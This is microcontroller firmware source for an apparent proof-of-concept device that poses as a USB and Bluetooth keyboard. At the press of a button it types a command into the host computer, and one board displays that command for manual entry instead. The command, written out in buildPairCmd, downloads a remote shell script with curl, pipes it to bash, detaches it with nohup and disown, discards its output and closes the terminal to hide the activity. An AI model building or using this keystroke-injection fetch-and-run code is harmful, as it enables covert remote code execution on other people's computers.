// USB-HID -> BLE-HID pairing-bootstrap PoC. One codebase, two boards (build flags).
// The board is a passive BLE keyboard. ONE button, one job: send the pairing
// bootstrap (T-Embed TYPES the one-liner over USB; C5 SHOWS it to run manually).
// Everything else — typing text, dropping/forgetting devices — is on the web page.
// The bottom status bar shows which links are up (PC HID + phone) and the count.
#include <Arduino.h>
#include "usb_hid.h"
#include "ble_hid.h"
#include "display.h"

#if defined(POC_BOARD_TEMBED)
static const int BTN = 0;    // encoder push (also BOOT)
#else
static const int BTN = 28;   // Waveshare BOOT
#endif

static bool     lastBtn = HIGH;
static uint32_t lastEdge = 0;
static bool     lastConn = false;

static void statusBar() { dispBle(bleHidConnected(), bleHidPhone(), bleHidConnCount()); }

static void idleScreen() {
    char b[128];
#ifdef POC_HAS_USB_HID
    snprintf(b, sizeof(b), "press = TYPE the\npairing payload\n\nMAC %s", bleHidMac());
#else
    snprintf(b, sizeof(b), "press = SHOW the\npair command\n\nMAC %s", bleHidMac());
#endif
    dispShow("PoC-KBD", b, 0x22D3E0);
    statusBar();
}

static void buildPairCmd(char* out, size_t n) {
    // Fetch-and-run, DETACHED: runs the hosted pairing helper in the background
    // (nohup + disown, output to pair.log, stdin from /dev/null) and closes the
    // terminal (exit) so nothing lingers on screen.
    snprintf(out, n,
        "nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s %s'"
        " >/dev/null 2>&1 & disown; exit", bleHidMac());
}

static void sendPairing() {
#ifdef POC_HAS_USB_HID
    dispShow("PAIRING", "detecting OS, then\ntyping the pairing\none-liner on the PC...", 0xF7C948); statusBar();
    usbSamplePayload(usbDetectOS());
    dispShow("PAIRING", "typed. run it — the\nPC will then connect.", 0x3FB950); statusBar();
#else
    char cmd[420]; buildPairCmd(cmd, sizeof(cmd));
    dispCmd("RUN THIS ON THE PC:", cmd); statusBar();
#endif
}

void setup() {
    pinMode(BTN, INPUT_PULLUP);
    Serial.begin(115200);
    dispBegin();
    usbHidBegin();
    bleHidBegin();
    delay(300);
    idleScreen();
    Serial.printf("[poc] ready. BLE MAC = %s\n", bleHidMac());
}

void loop() {
    bleHidTick();

    bool b = digitalRead(BTN);
    if (lastBtn == HIGH && b == LOW && millis() - lastEdge > 250) { lastEdge = millis(); sendPairing(); }
    lastBtn = b;

    static uint32_t t = 0;
    if (millis() - t > 800) { t = millis();
        bool c = bleHidConnected();
        if (c != lastConn) { lastConn = c; idleScreen(); }   // PC came/went -> refresh
        else statusBar();
        Serial.printf("[poc] pc=%s phone=%s conns=%d\n", c ? "on" : "off", bleHidPhone() ? "on" : "off", bleHidConnCount());
    }
    delay(10);
}
